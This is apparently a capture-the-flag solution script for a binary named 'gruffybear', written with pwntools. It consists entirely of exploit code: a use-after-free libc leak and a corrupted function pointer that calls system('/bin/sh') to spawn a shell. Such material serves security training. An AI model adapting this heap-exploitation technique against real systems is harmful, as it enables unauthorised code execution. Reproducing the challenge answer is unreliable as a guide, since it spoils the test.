from pwn import *

libc_path = 'libc-2.23.so'
if args.REMOTE:
    p = remote('ctf.pwn.sg', 4002)
else:
    p = process('./gruffybear', env={'LD_PRELOAD':  os.path.join(os.getcwd(), libc_path)})
    
libc = ELF(libc_path)

def build(name, id, age, desc):
    p.sendlineafter('0. Exit\n', '1')
    p.sendafter('Bear Name: ', name)
    p.sendlineafter('Bear ID: ', id)
    p.sendlineafter('Bear Age: ', str(age))
    p.sendafter('Bear Description: ', desc)
def select(idx):
    p.sendlineafter('0. Exit\n', '2')
    p.sendlineafter('Selection: ', str(idx))
def delete():
    p.sendlineafter('0. Exit\n', '3')
def prnt():
    p.sendlineafter('0. Exit\n', '4')
    p.recvuntil('You have selected: [', drop=True)
    name = p.recvuntil(']', drop=True)
    p.recvuntil('It\'s ID is ', drop=True)
    id = p.recvline()
    p.recvuntil('It\'s AGE is ', drop=True)
    age = p.recvline()
    p.recvuntil('It\'s DESCRIPTION is ', drop=True)
    #bug?
    desc = p.recvline()
    return (name, id, age, desc)
def add_comment(l, cmt):
    p.sendlineafter('0. Exit\n', '5')
    p.sendlineafter('How long should the comment be: ', str(l))
    p.sendafter('Comment: ', cmt)
def prnt_comment():
    p.sendlineafter('0. Exit\n', '6')
    return p.recvline()
def destruction():
    p.sendlineafter('0. Exit\n', '7')

build('AAAA\n', '90', 45, 'DESC')
build('BBBB\n', '90', 45, 'CDEf')
select(0)
delete()
libc_base = u64(prnt()[0].ljust(8,'\0'))-0x70-libc.symbols['__realloc_hook']
print(hex(libc_base))

system = libc_base + int(args.OFF,16)

add_comment(0xB8-1, '/bin/sh\0'.ljust(0xB0, '\0')+p64(system)[:-1])

for i in range(11):
    build('BBBB\n', '90', 45, 'CDEf')

p.sendlineafter('0. Exit\n', '1')
for i in 'SUNIATRETNE'[::-1]:
    p.send(i)
p.send('\n')

pause()

destruction()



p.interactive()










